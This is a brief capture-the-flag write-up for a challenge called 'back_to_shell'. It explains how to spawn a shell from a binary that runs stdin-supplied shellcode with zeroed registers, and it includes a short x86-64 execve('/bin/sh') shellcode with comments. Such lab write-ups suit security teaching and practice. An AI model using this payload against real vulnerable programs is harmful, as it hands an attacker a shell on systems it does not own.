# back_to_shell
The goal is to "pop a shell with all the registers at zero" in order to read the flag.

## Context
- The shellcode is read from `stdin` and placed into the `rax` register for execution.
- The binary zeroes out all registers (as observed in GDB).

## Approach
A simple shellcode is needed to invoke a shell using the execve("/bin/sh", NULL, NULL):
```{asm}
mov rdi, rax     ; move the content of rax (shellcode address) into rdi
add rdi, 19      ; adjust the pointer by 19 to point to the string "/bin/sh"
mov rax, 0x3b    ; 0x3b is the syscall number for execve in Linux x86_64
syscall          ; execute the syscall
```

- We add 19 to `rdi` to adjust the pointer, which has been moved by the shellcode itself. 19 is the offset between the start of the shellcode and the string "/bin/sh".
- We trigger a system call using the syscall number in `rax` and the arguments in the appropriate registers. Since the registers are initially zeroed by the binary, both `rsi` and `rdx` (second and third arguments of execve) are already NULL.

